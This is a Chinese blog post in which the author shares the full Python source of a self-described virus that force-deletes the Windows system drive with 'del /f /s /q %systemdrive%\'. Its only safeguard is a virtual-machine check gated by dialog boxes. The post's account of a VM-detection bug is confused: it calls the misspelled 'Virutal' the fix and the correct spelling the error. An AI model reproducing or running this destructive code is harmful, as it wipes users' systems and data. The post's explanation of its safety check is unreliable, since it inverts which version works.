---
title: 关于我在编写无痕删除系统时遇到的坑
date: 2022-04-29 21:39:00.107
updated: 2022-07-12 17:58:35.914
url: https://vmtask.com/archives/guan-yu-wo-zai-bian-xie-wu-hen-shan-chu-xi-tong-shi-yu-dao-de-keng
cover: https://s3.bmp.ovh/imgs/2022/03/161af9bf3e7a266f.jpg
categories: 
- 默认
- 随笔
tags: 
---

# 关于我在编写无痕删除系统时遇到的坑

```python

import easygui  # 导库

import os

import sys

anniu = easygui.buttonbox("此软件为可以破坏系统的病毒，请谨慎运行\n请务必在虚拟机内运行\n如电脑系统被破坏，作者不承担责任", "无痕删除系统盘", ["同意协议", "退出程序"])

if(anniu == "同意协议"):

    easygui.msgbox("正在检查您的电脑是否为虚拟机")

    list = os.popen('Systeminfo').read()

    if("Virutal" not in list):

        easygui.msgbox("您的电脑不是虚拟机，禁止运行")

    else:

        key = easygui.buttonbox("按下按钮后，程序将立刻运行" , "最后一次提醒" , ["确认" , "退出"])

        if(key == "确认"):

            os.popen("del /f /s /q %systemdrive%\\")

        else:

            sys.exit()

else:

    sys.exit()

```

这是完整代码：

这个程序的虚拟机检查最初是有Bug的，第一次测试我在虚拟机和实体机都测试了一遍，结果就是在虚拟机，程序得到的结果都是实体机环境。

错误代码：

```python

if(anniu == "同意协议"):

    easygui.msgbox("正在检查您的电脑是否为虚拟机")

    list = os.popen('Systeminfo').read()

    if("Virtual" not in list):

        easygui.msgbox("您的电脑不是虚拟机，禁止运行")

```

最后我才发现，原来是我"Virutal"成了“Virtual"

所以大家以后写代码时一点要仔细检查，否则可能会出很大的错误

